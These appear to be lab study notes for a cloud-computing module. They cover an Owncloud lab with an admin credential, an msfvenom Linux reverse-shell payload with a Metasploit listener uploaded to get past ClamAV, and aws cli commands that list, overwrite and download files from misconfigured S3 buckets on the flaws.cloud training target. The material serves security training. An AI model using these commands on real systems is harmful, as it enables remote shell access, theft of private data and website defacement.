# 19 - Cloud Computing

#### <mark style="color:purple;">**Module 19 - Cloud Computing**</mark>

<details>

<summary>EMPTY</summary>



</details>

## Owncloud&#x20;

* Hosted at ubuntu machine http://10.10.10.9/owncloud. admin:qwerty@123
* Create users and share files to users.
* Install Desktop client and share and view files

Bypassing ClamAV

Cloud is currently protected by ClamAV so no malicious file is uploaded.

* `msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.11 LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf` generate a linux based executable&#x20;
* Type `use multi/handler`
* Type `set payload linux/x86/shell/reverse_tcp`
* Type `set LHOST 10.10.10.11`
* Type `set LPORT 4444`
* Type `run`
* Upload payload in shared folder.
* Download using admin, Set permission to `chmod -R 755 exploit.elf`
* Execute exploit `./exploit.elf`

## S3 Buckets Enumeration

<details>

<summary>S3 Buckets</summary>

**S3 Buckets** are open cloud storage containers designed for storing items within the Simple Storage Service (S3). These S3 containers can be associated with directories and the storage of objects. Each item kept within these containers comprises three primary elements: the item's content (data), its metadata (encompassing details such as size, name, last modification date, and URL), and a distinct identifier for the item. Numerous websites utilize S3 containers for cloud-based file storage. **S3 bucket enumeration** refers to the procedure of discovering these S3 containers and subsequently cataloging the objects contained within them.

</details>

### Lazys3

{% embed url="https://github.com/nahamsec/lazys3" %}

**Lazys3** is a ruby script that allows to search for public S3 buckets.

* `ruby lazys3.rb` -> run it to enumerate buckets

### Cloud\_enum

{% embed url="https://www.kali.org/tools/cloud-enum/" %}

**Cloud\_enum** is a python script (prebuilt in Kali), that allows to search for public S3 buckets and also list their contents.

* Use the cloud\_enum tool to find and list down the contents of the buckets:

`cloud_enum -k flaws.cloud --disable-azure --disable-gcp`

### S3BucketList

{% embed url="https://github.com/AlecBlance/S3BucketList" %}

S3BucketList is a browser extension to enumerate S3 Buckets

## Exploiting S3 Unauthenticated

<details>

<summary><strong>Amazon S3 bucket</strong></summary>

**Amazon S3 bucket** is a user-friendly object repository, that is used for storing and recovering various data from anywhere on the web. Misconfigurations in S3 result in exposing private data or even complete compromise of websites in some cases

A potential misconfiguration can allow write/ delete access instead of read-only access. A private bucket that should have been configured to allow only authenticated access may have been misconfigured to allow public unauthenticated access

</details>

### AWS CLI

We can use Cloud enum tool to find and list down the contents of the buckets:

`cloud_enum -k flaws.cloud --disable-azure --disable-gcp`

and AWS CLI tool to find the contents of a bucket that allows unauthenticated access can be listed down with the following command

`aws s3 ls s3://flaw.cloud/ --no-sign-request`

If the AWS bucket allows write access, we can upload a file to AWS and can also overwrite the existing files which may result in the defacement of a public website

`aws s3 cp ./index.html s3://flaws.cloud --no-sign-request`

## Exploiting S3 Authenticated

A private bucket that should have been configured to allow only authenticated access for specific users may have been misconfigured to allow authenticated access from anyone

* Install S3 Bucket using AWS IAM (with user with programmatic access)
* Install awscli
* Configure the profile on aws cli with the keys from the account: `aws configure --profile new_profile`
* List the content of the S3 bucket with your profile: `aws s3 --profile ammar ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`
* Download the secret file `aws s3 --profile new_profile cp s3:/level2.c1g315dcds4a4a3sd4as41d2152.flaws.cloud/secret-e3453fc.html .`
